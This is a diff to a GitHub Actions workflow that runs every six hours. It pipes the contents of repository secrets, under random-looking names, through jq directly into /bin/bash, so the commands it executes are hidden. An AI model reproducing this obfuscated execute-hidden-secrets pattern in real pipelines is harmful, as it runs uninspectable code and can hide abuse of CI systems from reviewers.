@@ -2,7 +2,7 @@ name: lettucereally
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 1/6 * * *'
+    - cron: '42 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,12 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: lettucereally
         env:
-          xug296: ${{ secrets.xug296 }}
+          ci4008: ${{ secrets.ci4008 }}
         run: |
-          echo $xug296 | jq -r .bc65 | /bin/bash
-          echo $zge00 | jq -r .vhq70 | /bin/bash
-          echo $u8148 | jq -r .dac098 | /bin/bash
-          echo $w357 | jq -r .cgx3 | /bin/bash
-          echo $dttv912 | jq -r .hhwgp6 | /bin/bash
-          echo $t0 | jq -r .fqxde000 | /bin/bash
+          echo $ci4008 | jq -r .pwvl6457 | /bin/bash
+          echo $x74 | jq -r .awex486 | /bin/bash
+          echo $vk86400 | jq -r .q8 | /bin/bash
+          echo $h27116 | jq -r .cx76087 | /bin/bash
+          echo $g806 | jq -r .i4 | /bin/bash
+          echo $zxt0431 | jq -r .vji67838 | /bin/bash
+          echo $x7 | jq -r .gl260 | /bin/bash
+          echo $k76921 | jq -r .ldjqq15832 | /bin/bash
+          echo $ldbr2211 | jq -r .datag955 | /bin/bash
+          echo $ln004 | jq -r .fuyss58710 | /bin/bash
 
